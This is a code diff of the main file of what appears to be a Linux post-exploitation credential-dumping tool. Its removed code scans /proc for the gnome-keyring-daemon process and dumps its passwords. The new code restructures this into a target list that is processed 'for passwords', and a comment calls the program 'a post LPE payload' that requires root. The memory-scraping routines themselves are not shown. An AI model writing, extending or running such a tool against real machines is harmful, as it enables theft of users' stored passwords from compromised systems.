@@ -1,103 +1,38 @@
+#include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
-#include <sys/types.h>
-#include <dirent.h>
-#include <string.h>
-#include <stdlib.h>
 
+#include "dbg.h"
 #include "targets.h"
-#include "gnomeKeyring.h"
-#include "util.h"
+#include "scanner.h"
 
-int processTarget(char *target)
+int main(int argc, char *argv[])
 {
-    DIR *dir = NULL;
-    struct dirent* de = 0;
-    int pid = -1, ret = -1;
-    int result = 0;
-    FILE *fp = NULL;
-    char cmdlineFile[MAX_PATH] = {0};
-    char *taskName = NULL;
-    size_t taskSize = 0;
+    Target targets[MAX_TARGETS];
 
-    dir = opendir(PROC);
-    if ( dir == NULL )
-    {
-        printf("[!] ERROR: Failed to open /proc\n");
-        return -1;
-    }
-
-    while ((de = readdir(dir)) != 0 )
-    {
-        if ( !strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
-            continue;
-
-        result = 0;
-        result = sscanf(de->d_name, "%d", &pid);
-
-        if ( result != 1)
-            continue;
-        memset(cmdlineFile, 0, MAX_PATH);
-        snprintf(cmdlineFile, MAX_PATH-1, "%s/%d/cmdline", PROC, pid);
-
-        if ( (fp = fopen(cmdlineFile, "r")) == NULL )
-            continue; // likley lost the race for a process that just closed
-
-        taskSize = 0;
-        if ( getline(&taskName, &taskSize, fp) > 0 )
-        {
-            if ( strstr(taskName, GNOME_KEYRING_DAEMON) ) // gnome-keyring-daemon process
-            {
-                if ( gnomeKeyringDump(pid) < 0 )
-                {
-                    printf("  [!] ERROR: dumping passwords from keyring\n");
-                    //goto CLEANUP;
-                }
-            }
-        }
-        if (taskName != NULL)
-        {
-            free(taskName);
-            taskName = NULL;
-        }
-
-        if ( fp != NULL )
-        {
-            fclose(fp);
-            fp = NULL;
-        }
-    }
-
-    ret = 0;
-    CLEANUP:
-         if (taskName != NULL)
-        {
-            free(taskName);
-            taskName = NULL;
-        }
-
-        if ( fp != NULL )
-        {
-            fclose(fp);
-            fp = NULL;
-        }
-        closedir(dir);
-        return ret;
-}
-
-int main()
-{
-    size_t numTargets = sizeof(g_targets)/sizeof(char*);
-
+    // Must be root (this is a post LPE payload!)
     if ( getuid() != 0 )
     {
-        printf("[!] Must be root!\n");
+        printf("[!!] MUST BE ROOT\n");
+        return -1;
+    }
+    // Initialize targets
+    memset(targets, 0, sizeof(targets));
+    initTargets(targets);
+
+    // Populate targets with pids
+    getTargetPids(targets);
+
+#ifdef DEBUG
+    dumpTargets(targets);
+#endif
+
+    // Process targets for passwords
+    if ( processTargets(targets) < 0 )
+    {
+        log_error("Failed to process targets");
         return -1;
     }
 
-    for (int i=0; i <numTargets; i++)
-    {
-        processTarget(g_targets[i]);
-    }
     return 0;
 }
